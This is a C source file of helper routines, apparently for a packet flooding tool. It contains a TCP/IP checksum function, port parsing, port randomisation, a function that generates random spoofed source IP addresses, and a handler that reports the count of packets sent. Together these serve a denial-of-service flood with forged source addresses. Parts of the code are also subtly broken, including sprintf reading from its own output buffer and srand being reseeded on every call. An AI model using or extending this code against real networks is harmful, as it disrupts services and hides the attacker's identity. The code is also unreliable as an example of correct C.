#include <getopt.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <signal.h>

#include "funcs.h"

#define DATAGRAM_SIZE 1500
//Here are all of the functions of the main file


unsigned short checkSum(unsigned short *pointer, int bytes) {
    register long sum;
    unsigned short oddByte;
    register short answer;

    sum = 0;
    while(bytes > 1) {
        sum += *pointer++;
        bytes -= 2;
    }
    if(bytes == 1) {
        oddByte = 0;
        *((u_char*)&oddByte) = *(u_char*)pointer;
        sum += oddByte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);

    return (short)~sum;
}


//Turning a char* to an integer
int strtoint_n(char* str, int n)
{
    int place = 1;
    int ret = 0;

    int i;
    for (i = n-1; i >= 0; i--, place *= 10)
    {
        int c = str[i];
            if (c >= '0' && c <= '9')   ret += (c - '0') * place;
            else
            {
              printf("Invalid port!");
              return -1;
            }
    }
    if(ret < 0 || ret > 65535)
    {
      printf("Invalid port! not in range!");

      return -1;
    }
    return ret;
}
//Turning a char* to an integer
int strtoint(char* str)
{
    char* temp = str;
    int n = 0;
    while (*temp != '\0')
    {
        n++;
        temp++;
    }
    int ret = strtoint_n(str, n);
    if(ret == -1)
    {
      printf("Error with port parsing!");
      exit(1);
    }
    return ret;
}

//Randomizing the port
int randomPort()
{
  time_t t;
  srand((unsigned) time(&t));
  port = (port + rand()) % 65535;
  int r = port;
  return r;
}
//Randomizing numbers for IP spoofing
int getRand()
{
  time_t t;
  srand((unsigned) time(&t));
  change = (change + rand()) % 255;
  int r = change;
  return r;
}

//IP spoofer
char* spoof()
{
  strcpy(srcip, "");
  int dots = 0;
  while(dots < 3)
  {
    sprintf(srcip,"%s%d",srcip,getRand());
    strcat(srcip,".");
    fflush(NULL);
    dots++;
  }
  sprintf(srcip,"%s%d",srcip,getRand());
  strcat(srcip,"\0");
  return srcip;
}

int validIP(char *ipv4)
{
  struct sockaddr_in sa;
  return inet_pton(AF_INET, ipv4, &(sa.sin_addr)) != 0;
}

//SIGINT handler for stopping the while loop
void myHandler(int signal)
{
    if(signal == SIGINT)
    {
      shutdown(soc, SHUT_RDWR);
      printf("\n%zu packets sent\n", pkt_count);
      exit(0);
    }
}
